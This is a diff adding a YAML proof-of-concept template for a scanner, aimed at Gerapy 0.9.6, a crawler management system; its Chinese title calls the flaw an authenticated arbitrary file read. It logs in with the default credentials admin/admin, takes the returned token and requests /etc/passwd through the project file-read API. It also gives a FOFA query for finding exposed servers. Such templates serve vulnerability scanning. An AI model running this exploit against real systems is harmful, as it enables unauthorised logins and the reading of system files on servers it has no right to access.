@@ -1,0 +1,32 @@
+id: poc-yaml-gerapy-crawler-management-system-fileread
+info:
+  name: Gerapy 0.9.6 project/file/read 后台任意文件读取
+  severity: high
+  tags:
+  - 文件读取
+  finger: gerapy
+  fofa: title="Gerapy"
+requests:
+- method: POST
+  path: /api/user/auth
+  headers:
+    Content-Type: application/json;
+  data: '{"username":"admin","password":"admin"}'
+  output:
+  - set_var("token",find_json(body,"token"))
+  expression: 'status_code == 200
+
+    '
+- method: POST
+  path: /api/project/file/read
+  headers:
+    Content-Type: application/json;
+    Authorization: Token {{.token}}
+  data: '{"path":"/etc/", "label":"passwd"}'
+  expression: 'status_code == 200 &&
+
+    matches(body, "root:.*:0:0:")
+
+    '
+variables: {}
+transport: http
